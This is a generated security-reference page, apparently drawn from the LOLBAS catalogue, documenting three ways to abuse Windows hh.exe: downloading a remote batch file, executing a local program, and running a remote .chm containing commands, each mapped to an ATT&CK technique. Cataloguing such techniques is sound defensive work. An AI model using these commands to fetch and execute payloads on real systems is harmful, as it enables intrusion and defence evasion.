---
parsed_by: focuslocust
source: commands
type: generated
---
# Hh Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Hh.exe

Tool page: [Hh.exe](../../tools/windows/hh.exe.md)

### Download files from url

```text
HH.exe {REMOTEURL:.bat}
```

Description:

Open the target batch script with HTML Help.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Hh.yml` |
| Evidence | Command preserved from source parser. |

### Execute process with HH.exe

```text
HH.exe {PATH_ABSOLUTE:.exe}
```

Description:

Executes specified executable with HTML Help.

Related ATT&CK:

- [T1218.001](../../attack/techniques/T1218.001-compiled-html-file.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Hh.yml` |
| Evidence | Command preserved from source parser. |

### Execute commands with HH.exe

```text
HH.exe {REMOTEURL:.chm}
```

Description:

Executes a remote .chm file which can contain commands.

Related ATT&CK:

- [T1218.001](../../attack/techniques/T1218.001-compiled-html-file.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Hh.yml` |
| Evidence | Command preserved from source parser. |
